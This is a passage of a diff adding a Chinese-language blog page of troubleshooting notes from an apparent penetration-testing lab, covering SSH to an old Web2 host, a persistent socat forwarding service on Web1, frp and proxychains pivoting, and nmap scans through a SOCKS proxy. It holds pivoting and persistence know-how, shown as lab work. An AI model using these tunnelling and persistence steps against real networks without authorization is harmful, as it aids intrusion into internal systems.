+<p>Web2 服务端：OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13（非常老，Ubuntu 14.04 时代的版本）</p>
+</li>
+<li>
+<p>Kali 的 OpenSSH 版本（8.8 及以上）默认禁用了 ssh-rsa 签名算法（基于 SHA-1），因为它已不安全。而你的 Web2 服务端太老，很可能只支持这种旧的 ssh-rsa 算法。</p>
+</li>
+<li>
+<p>结果就是：客户端说“我不玩 ssh-rsa 了”，服务端说“我只会 ssh-rsa”，双方谈不拢，公钥认证直接失败，然后回退到密码认证。</p>
+</li>
+</ul>
+<p><strong>解决方法</strong></p>
+<p>命令执行时指定参数：在 ssh 命令中加上 -o PubkeyAcceptedKeyTypes=+ssh-rsa 参数
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>proxychains4 ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /root/.ssh/id_rsa ubuntu@192.168.52.20
+</span></code></pre></div></p>
+<h3 id="_30">创建持久化服务时报错<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong></p>
+<p>给web1创建net-forward.service时报错Exec format error</p>
+<p><strong>原因</strong></p>
+<p>socat 没有写绝对路径，ExecStart需要绝对路径，不能用相对路径</p>
+<p><strong>解决方法</strong></p>
+<p>修复方法：把 socat 改成它的完整路径</p>
+<h3 id="52web2ssh">配置52网段代理持久化时连不上web2的ssh<a class="headerlink" href="#52web2ssh" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong></p>
+<p>web1和kali都配置好并启动frp后，使用proxychains4连接web2的ssh但是连不上
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-26-21.png" /></p>
+<p><strong>原因</strong></p>
+<p>经过排查frp 隧道和 SOCKS5 代理是完好的，且 Web2 的 22 端口也是完全开放的。时因为proxychains4 配置问题。
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-35-42.png" />
+在/etc/proxychains4.conf中[ProxyList]中有其他的代理，导致proxychains 把 SSH 连接目标错误地解析成了 0.0.0.0:12349，而不是 192.168.52.20:22。这导致代理试图去连接一个不存在的地址，自然就超时并返回 Connection refused 了</p>
+<ul>
+<li>
+<p><em>多代理链的机制</em>：proxychains4 在 [ProxyList] 里写多行代理时，默认是串联（链式）的。如果不注释掉，它会尝试先连 A，再用 A 连 B，最后用 B 去访问目标。</p>
+</li>
+<li>
+<p><em>dynamic_chain</em> 的“并发”陷阱：如果在配置文件的头部开启了 dynamic_chain，proxychains 会尝试同时去连列表里的所有代理。如果其中某个代理（比如如果配置中有 socks5 0.0.0.0 12349 或类似的失效代理）不可用，它就会在这个节点卡住或报错。</p>
+</li>
+</ul>
+<p><strong>解决方法</strong></p>
+<p>把多余的代理注释掉只留127.0.0.1 9050这个代理
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-37-07.png" /></p>
+<p><strong>另外</strong></p>
+<ul>
+<li>
+<p>如果是单层代理，用 strict_chain 最稳</p>
+</li>
+<li>
+<p>如果是多层代理（比如 Kali -&gt; 代理A -&gt; 代理B -&gt; 目标），需要用到 dynamic_chain。</p>
+</li>
+</ul>
+<h3 id="proxychains4nmap">使用proxychains4进行nmap扫描时失败<a class="headerlink" href="#proxychains4nmap" title="Permanent link">&para;</a></h3>
+<p><strong>现象</strong></p>
+<p>配置好代理后用proxychains4转发请求对93网段进行nmap扫描时全都显示失败或超时
+<img alt="" src="https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-23-21-06.png" /></p>
+<p><strong>原因</strong></p>
+<ul>
+<li>
+<p>nmap 默认会用原始套接字、ICMP 或 UDP 来探测主机，而 SOCKS5 代理（proxychains 走的就是它）只支持 TCP，一旦 nmap 试图发非 TCP 的包，就会在代理层直接失败并显示超时。</p>
+</li>
+<li>
+<p>虽然加了 -sT（TCP Connect 扫描）和 -Pn（跳过主机发现），但 nmap 在以 root 权限运行时，依然会尝试用底层原始套接字去做一些辅助探测，从而触发问题</p>
+</li>
+</ul>
+<p><strong>解决方法</strong></p>
+<p>在命令里加上 --unprivileged 参数，强制 nmap 完全放弃原始套接字，只走普通的 TCP 连接：</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>proxychains4<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span>-Pn<span class="w"> </span>--unprivileged<span class="w"> </span><span class="m">192</span>.168.93.40
+</span></code></pre></div>
+<h3 id="_31"><a class="headerlink" href="#_31" title="Permanent link">&para;</a></h3>
+
+
+
+
+
+
+
+  
+    
+  
+  
+    
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="October 21, 2026 17:46:11 UTC"><span class="timeago" datetime="2026-10-21T17:46:11+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="October 21, 2026 17:46:11 UTC">2026-10-21</span>
+  </span>
+
+    
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Created">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="October 21, 2026 17:46:11 UTC"><span class="timeago" datetime="2026-10-21T17:46:11+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="October 21, 2026 17:46:11 UTC">2026-10-21</span>
+  </span>
+
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      © 2026 青春沙盒 - 记录技术，也记录青春
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/ethicalpaws" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://twitter.com/ethicalpaws" target="_blank" rel="noopener" title="Twitter" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.indexes", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../../../js/timeago.min.js"></script>
+      
+        <script src="../../../../../../js/timeago_mkdocs_material.js"></script>
+      
+    
+  </body>
+</html>
